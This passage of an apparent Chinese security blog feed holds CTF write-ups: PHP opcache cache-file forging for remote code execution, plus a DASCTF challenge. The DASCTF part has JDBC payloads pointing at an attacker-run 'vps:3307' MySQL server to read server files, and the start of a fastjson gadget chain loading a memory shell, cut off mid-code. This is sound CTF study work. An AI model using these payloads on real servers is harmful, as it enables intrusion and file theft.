class="hljs-string">&quot;self after&quot;</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">before</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;self before&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;after&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.After&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;before&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.Before&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;simple&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.service.SimpleImpl&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selfcut&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.Selfcut&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--开始配置aop--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">aop:config</span>&gt;</span><span class="hljs-comment">&lt;!--引入selfcut作为切面类--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">aop:aspect</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;selfcut&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--定义切入点--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">aop:pointcut</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--定义通知，引入切点--&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">aop:after</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;after&quot;</span> <span class="hljs-attr">pointcut-ref</span>=<span class="hljs-string">&quot;point&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">aop:before</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;before&quot;</span> <span class="hljs-attr">pointcut-ref</span>=<span class="hljs-string">&quot;point&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">aop:aspect</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">aop:config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="注解实现"><a href="#注解实现" class="headerlink" title="注解实现"></a>注解实现</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.19<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;simple&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.service.SimpleImpl&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--  需要注册bean --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selfcut&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.Selfcut&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!-- 开启注解扫描 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">aop:aspectj-autoproxy</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.boogipop.cutface;<span class="hljs-keyword">import</span> org.aspectj.lang.JoinPoint;<span class="hljs-keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;<span class="hljs-keyword">import</span> org.aspectj.lang.annotation.*;<span class="hljs-keyword">import</span> org.aspectj.lang.annotation.After;<span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Before;<span class="hljs-comment">//定义切面类</span><span class="hljs-meta">@Aspect</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Selfcut</span> &#123;    <span class="hljs-meta">@Before(&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;===self before===&quot;</span>);    &#125;    <span class="hljs-meta">@After(&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;===self after===&quot;</span>);    &#125;    <span class="hljs-meta">@Around(&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint jp)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        System.out.println(<span class="hljs-string">&quot;环绕前&quot;</span>);<span class="hljs-comment">//        执行切入点的方法</span>        <span class="hljs-type">Object</span> <span class="hljs-variable">proceed</span> <span class="hljs-operator">=</span> jp.proceed();        System.out.println(<span class="hljs-string">&quot;环绕后&quot;</span>);<span class="hljs-comment">//        获取签名</span>        System.out.println(jp.getSignature());    &#125;    <span class="hljs-meta">@AfterReturning(&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterreturn</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;after return&quot;</span>);    &#125;&#125;</code></pre></div><p>顺序为环绕前-&gt;执行前-&gt;方法执行-&gt;返回后通知-&gt;执行后-&gt;环绕执行后（这里是spring6的顺序，spring5貌似不一样，不过问题不大</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php Opcache插件进行RCE</title>
    <link href="/2024/01/17/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/"/>
    <url>/2024/01/17/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="php-opcache缓存进行RCE"><a href="#php-opcache缓存进行RCE" class="headerlink" title="php opcache缓存进行RCE"></a>php opcache缓存进行RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于<code>opcache</code>我是在去年三四月份从B站上的nepnep战队的一个分享会上看到的，当时觉得很难，就记录了一下操作，记住了这个词，然后就没出现过了</p><p>再次见到就是Boogipop大佬的文章，不过也没看，一直到现在复现DASCTF X 0psu3的一个题目用到了，就来看一遍，相当于是重新学一遍了</p><p>复现一遍Boogipop大佬文章，我这里详细给出了环境搭建的命令（当然若是大佬可以直接看原文）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><div class="code-wrapper"><pre><code class="hljs awk">docker pull php:<span class="hljs-number">7.1</span>-apache<span class="hljs-regexp">//</span>docker pull php:<span class="hljs-number">8.2</span>-apachedocker run -d -p <span class="hljs-number">9000</span>:<span class="hljs-number">80</span> --name opcache7 php:<span class="hljs-number">7.1</span>-apacheapt-get updateapt install vimvim phpinfo.php    <span class="hljs-regexp">//</span>写phpinfo<span class="hljs-regexp">//</span>安装opcache插件docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcachevim <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>php/php.ini-production<span class="hljs-regexp">//</span>找到opcache部分添加下面三行句子[opcache]opcache.enable=<span class="hljs-number">1</span>opcache.file_cache=<span class="hljs-string">&quot;/tmp&quot;</span>opcache.file_cache_only=<span class="hljs-number">1</span><span class="hljs-regexp">//</span>docker的php是没有php.ini配置文件的，修改了php.ini-production后复制并重命名为php.ini即可cp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/php.ini-production /u</span>sr<span class="hljs-regexp">/local/</span>etc<span class="hljs-regexp">/php/</span>php.ini<span class="hljs-regexp">//</span>修改了php.ini要重启服务service apache2 reload</code></pre></div><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117181811688.png" alt="image-20240117181811688"></p><p>看到这一行就说明配置成功了</p><p>看一下docker中的文件</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117145457621.png" alt="image-20240117145457621"></p><p>当Opcache第一次缓存文件时， <code>/tmp/system_id/var/www/html/phpinfo.php.bin</code></p><h2 id="php7-Opcache"><a href="#php7-Opcache" class="headerlink" title="php7 Opcache"></a>php7 Opcache</h2><p>首先说一下Opcache rce的原理，Opache是php中一个生成缓存文件的拓展，当我们访问一个php文件时，他会产生一个缓存文件，下次访问该php文件时，就是直接根据缓存文件回显页面了。</p><p>那很明显伪造文件替换即可</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117145457621.png" alt="image-20240117145457621"></p><p>缓存文件夹是<code>1116d566fdc53f79abce6c01e3a0308d</code>这个是今天的重点，我们怎么去算这个<code>system_id</code>呢？</p><p>在之前的笔记中，我记录它为文件上传 LFI + phpinfo，是可以根据phpinfo的信息计算出来<code>system_id</code>的</p><p>在PHP环境下已经有前人给出我们计算脚本<br><code>https://github.com/GoSecure/php7-opcache-override</code></p><p>php7.3版本好像太高算不对，于是Boogipop大佬降低了版本为7.1</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117145519755.png" alt="image-20240117145519755"></p><p>我们怎么利用呢？当我们存在任意文件写入或者覆盖时，我们可以通过覆盖<code>.php.bin</code>文件达到RCE的目的</p><p>我们把缓存文件下载下来分析一下</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117145739241.png" alt="image-20240117145739241"></p><p>可以看到最开头是OPACHE+systemid，因此假如我们获取到了SYSTEMID，我们就可以伪造一份缓存文件了，但是还需要注意一点</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117183119719.png" alt="image-20240117183119719"></p><p>我们这里的<code>opcache</code>拓展开启了<code>timestamp</code>，也就是时间戳验证，那么假如我们创建的文件时间戳不对的话，我们也无法覆盖成功的QWQ，那么就需要题目有一个获取时间的地方，假如可以下载任意文件或者直接获取时间戳，那么我们可以用010editor直接修改。</p><p>干到这里时我实在是受不了原来那版010了，又耗费精力找新的破解版，耗了不少时间，服了</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117183402563.png" alt="image-20240117183402563"></p><p>从<code>0040h</code>开始，即<strong>第五行</strong>开始的8个字节（图中蓝色部分）即是时间戳</p><p>这里我们再启动一个容器就行，与原来一样的配置（只是在<code>phpinfo.php</code>文件中写入一句话木马），这样就省下计算<code>system_id</code>这一步了</p><p>同样会生成一个<code>phpinfo.php.bin</code>文件，弄下来修改为前一个的system_id(已省略)和时间戳</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117162146324.png" alt="image-20240117162146324"></p><p>然后把这个修改过的文件替换掉环境中的文件即可</p><p>我是把原来的直接删掉，然后通过base64写入文件</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117175735733.png" alt="image-20240117175735733"></p><p>然后访问phpinfo.php就会变得空白，说明一句话木马写入成功</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117175701476.png" alt="image-20240117175701476"></p><p>这样就成功getshell了，需要注意一下生成恶意bin文件的php版本需要大致吻合，不能差太多。</p><h2 id="php8-opcache"><a href="#php8-opcache" class="headerlink" title="php8 opcache"></a>php8 opcache</h2><p>在PHP8之后，opcache生成system_id的方法有些许改变，所以之前的脚本是跑不出来了</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117180130700.png" alt="image-20240117180130700"></p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117180147678.png" alt="image-20240117180147678"></p><p>可以看到算出的<code>system_id</code>不同</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117184508737.png" alt="image-20240117184508737"></p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117184527792.png" alt="image-20240117184527792"></p><p>Boogipop大佬并没有说出规律是什么</p><p>经过我的尝试，规律很简单，就是修改API前的版本号</p><p>我这里是8.2.14</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117184659142.png" alt="image-20240117184659142"></p><p>再加上框框中的内容</p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117185550804.png" alt="image-20240117185550804"></p><p>所以得出计算代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;8.2.14API420220829,NTSBIN_4888(size_t)8\002&quot;</span>));</code></pre></div><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117180524000.png" alt="image-20240117180524000"></p><p><img src="/../images/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/image-20240117180147678.png" alt="image-20240117180147678"></p><p>后面的步骤是一样的，就不试了</p><h2 id="春秋杯2023-php-again"><a href="#春秋杯2023-php-again" class="headerlink" title="春秋杯2023-php_again"></a>春秋杯2023-php_again</h2><p>给出Boogipop大佬文章中的例题，</p><p>考点就是opache8的缓存文件利用：</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$action</span>)) &#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;    <span class="hljs-keyword">case</span> <span class="hljs-number">0_0</span>:        <span class="hljs-title function_ invoke__">phpinfo</span>();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0o0_111</span>:        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;zip -r /tmp/www.zip *&#x27;</span>);        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/tmp/www.zip&#x27;</span>);        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0b0_111</span>:        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>));        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0x0_555</span>:        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;/tmp/tmp.zip&#x27;</span>,<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]));        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">777_777</span>:        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o tmp.zip&#x27;</span>);        <span class="hljs-keyword">break</span>;&#125;</code></pre></div><p>首先是一个软链接读文件，然后是unzip解压覆盖文件，满足了所有条件后就可以按照上述步骤进行处理，getshell了</p><p>这感觉好难啊</p><h2 id="DASCTF-X-0psu3-十一月挑战赛-single-php"><a href="#DASCTF-X-0psu3-十一月挑战赛-single-php" class="headerlink" title="DASCTF X 0psu3 十一月挑战赛   single_php"></a>DASCTF X 0psu3 十一月挑战赛   single_php</h2><p>就给个代码，看文章复现吧</p><p><a href="https://boogipop.com/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/#single-php">DASCTF X 0psu3 Web Writeup - Boogiepop Doesn’t Laugh (boogipop.com)</a></p><p>好像都是解压覆盖这种</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;S* has the kanojo but you don&#x27;t&quot;</span>);&#125; <span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/x-tar&#x27;</span>)&#123; <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]); &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable language_">$this</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();&#125;&#125;<span class="hljs-variable">$kanozyo</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;LuckyE&#x27;</span>](<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$kanozyo</span>);<span class="hljs-variable">$suki</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;suki&#x27;</span>]);</code></pre></div><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/">PHP8 OPCACHE缓存文件导致RCE - Boogiepop Doesn’t Laugh (boogipop.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X Opsu3十一月挑战赛</title>
    <link href="/2024/01/15/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/01/15/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-X-0psu3-十一月挑战赛-web-复现"><a href="#DASCTF-X-0psu3-十一月挑战赛-web-复现" class="headerlink" title="DASCTF X 0psu3 十一月挑战赛-web 复现"></a>DASCTF X 0psu3 十一月挑战赛-web 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉每次DASCTF的web题都巨难，始终还是自己太菜了</p><h2 id="ezfastjson"><a href="#ezfastjson" class="headerlink" title="ezfastjson"></a>ezfastjson</h2><p>没环境，看WP</p><p>访问服务可以看到mysql连接测试。可以猜测后台是用jdbc进行连接测试的。</p><p>搭建恶意的mysql服务器。后台是把host和port这些拼接的，那其实只提交host也可以了，再用#符号把后面的脏数据闭合掉。</p><p>这里可以使用jdbc的一些参数连接恶意mysql服务器进行任意文件读取</p><p><code>allowUrlInLocalInfile</code>属性的判断，如果为<code>true</code>，那么就会使用URL类来加载我们提供的路径</p><p>列出根目录文件</p><div class="code-wrapper"><pre><code class="hljs Plain">&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125;</code></pre></div><p>读取jar包</p><div class="code-wrapper"><pre><code class="hljs Plain">&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125;</code></pre></div><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115221604694.png" alt="image-20240115221604694"></p><p>出题人逻辑顺序有误，这里的waf是先进行了fastjson解析后，才进行危险字符检测的。我都rce了。你检测到了又怎么样。</p><p>直接打一个1.2.43版本的jndi注入就行了</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>因为waf太硬了，基本没有绕过手段，所以利用fastjson的话肯定是用fastjson的反序列化链子</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115222310560.png" alt="image-20240115222310560"></p><p>现在的我看的话直接就是Neepuctf的那条链（AbstractAction），直接秒了</p><p>直接给出官方WP  （他这一看就是带jar包使用agent的，呜呜呜我没有）</p><div class="code-wrapper"><pre><code class="hljs java"> <span class="hljs-keyword">package</span> com.example.testfang;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.example.no.MyObjectInputStream;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<span class="hljs-keyword">import</span> javassist.ClassPool;<span class="hljs-keyword">import</span> javax.swing.*;<span class="hljs-keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;<span class="hljs-keyword">import</span> javax.swing.text.StyledEditorKit;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solve</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>,                <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(MemShell.class.getName()).toBytecode()&#125;        );        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();        arrayList.add(templates);        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);        <span class="hljs-type">XString</span> <span class="hljs-variable">xstr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;&quot;</span>);        StyledEditorKit.<span class="hljs-type">AlignmentAction</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> Reflections.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);        setFieldValue(action, <span class="hljs-string">&quot;changeSupport&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title 